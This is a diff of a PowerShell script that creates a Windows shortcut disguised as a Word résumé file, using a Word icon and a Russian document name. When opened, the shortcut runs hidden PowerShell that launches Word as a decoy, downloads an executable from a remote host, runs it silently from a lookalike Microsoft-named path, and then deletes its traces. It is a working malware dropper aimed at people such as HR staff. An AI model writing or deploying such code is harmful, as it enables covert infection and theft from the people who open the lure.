@@ -1,6 +1,6 @@
-$url = 'https://clck.ru/<file>'
+$url = 'http://192.168.0.12:8000/winrar_x64_165.23245.56f.exe'
 $output = 'C:\ProgramData\Microsoft.SqlServer.C0mpact.WindowsHolographicDevices400.32.bc.exe'
-$shortcutPath = "$PWD\Резюме бомжа для HR кликни пж.docx.lnk"
+$shortcutPath = "$PWD\Резюме Иванов К.К..docx.lnk"
 
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($shortcutPath)
@@ -14,14 +14,11 @@ Start-Process -FilePath 'C:\Program Files\Microsoft Office\root\Office16\WINWORD
 Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
 Start-Sleep -Seconds 1
 Start-Process -FilePath $output -Wait -WindowStyle Hidden
-
 Start-Sleep -Seconds 1
-if (Test-Path $output) { Remove-Item -Path $output -Force }
-if (Test-Path $shortcutPath) { Remove-Item -Path $shortcutPath -Force }
+if (Test-Path '$output') { Remove-Item -Path '$output' -Force }
+if (Test-Path '$shortcutPath') { Remove-Item -Path '$shortcutPath' -Force }
 "@
 
 $Shortcut.Arguments = "/nop /noni -WindowStyle Hidden -Command `"& { $psCommand }`""
 $Shortcut.IconLocation = 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0'
 $Shortcut.Save()
-
-
